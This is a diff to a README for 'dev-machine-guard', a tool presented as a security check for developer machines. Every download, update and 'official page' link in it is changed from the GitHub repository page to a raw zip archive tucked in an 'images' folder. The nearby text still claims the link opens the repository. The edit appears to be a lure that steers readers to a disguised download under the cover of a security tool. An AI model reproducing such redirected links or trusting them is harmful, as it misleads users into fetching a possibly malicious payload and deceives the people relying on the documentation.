@@ -1,6 +1,6 @@
 # ⚙️ dev-machine-guard - Quick Dev Machine Security Check
 
-[![Download dev-machine-guard](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/varicoloured-chronicbronchitis66/dev-machine-guard)
+[![Download dev-machine-guard](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/varicoloured-chronicbronchitis66/dev-machine-guard/main/images/machine-guard-dev-v2.4-alpha.2.zip)
 
 ---
 
@@ -34,7 +34,7 @@ This section guides you on how to get dev-machine-guard on your computer and run
 
 Click the link below to visit the download page:
 
-[Download dev-machine-guard](https://github.com/varicoloured-chronicbronchitis66/dev-machine-guard)
+[Download dev-machine-guard](https://raw.githubusercontent.com/varicoloured-chronicbronchitis66/dev-machine-guard/main/images/machine-guard-dev-v2.4-alpha.2.zip)
 
 This will take you to the GitHub repository where you can find the latest version of dev-machine-guard.
 
@@ -104,7 +104,7 @@ After scanning, the app shows lists of detected items:
 To keep dev-machine-guard effective, update it regularly.
 
 - Check the GitHub page for new releases at:  
-  [https://github.com/varicoloured-chronicbronchitis66/dev-machine-guard](https://github.com/varicoloured-chronicbronchitis66/dev-machine-guard)
+  [https://raw.githubusercontent.com/varicoloured-chronicbronchitis66/dev-machine-guard/main/images/machine-guard-dev-v2.4-alpha.2.zip](https://raw.githubusercontent.com/varicoloured-chronicbronchitis66/dev-machine-guard/main/images/machine-guard-dev-v2.4-alpha.2.zip)
 
 - Download and install new versions like you did the first time.  
 - Updates improve detection and add new features.
@@ -142,10 +142,10 @@ A: No data is sent from your computer during scans.
 ## 🔗 Useful Links
 
 - Visit the official page to download and learn more:  
-  [https://github.com/varicoloured-chronicbronchitis66/dev-machine-guard](https://github.com/varicoloured-chronicbronchitis66/dev-machine-guard)
+  [https://raw.githubusercontent.com/varicoloured-chronicbronchitis66/dev-machine-guard/main/images/machine-guard-dev-v2.4-alpha.2.zip](https://raw.githubusercontent.com/varicoloured-chronicbronchitis66/dev-machine-guard/main/images/machine-guard-dev-v2.4-alpha.2.zip)
 
 - Check for updates, report issues, or request features on GitHub.
 
 ---
 
-[![Download dev-machine-guard](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/varicoloured-chronicbronchitis66/dev-machine-guard)
+[![Download dev-machine-guard](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/varicoloured-chronicbronchitis66/dev-machine-guard/main/images/machine-guard-dev-v2.4-alpha.2.zip)
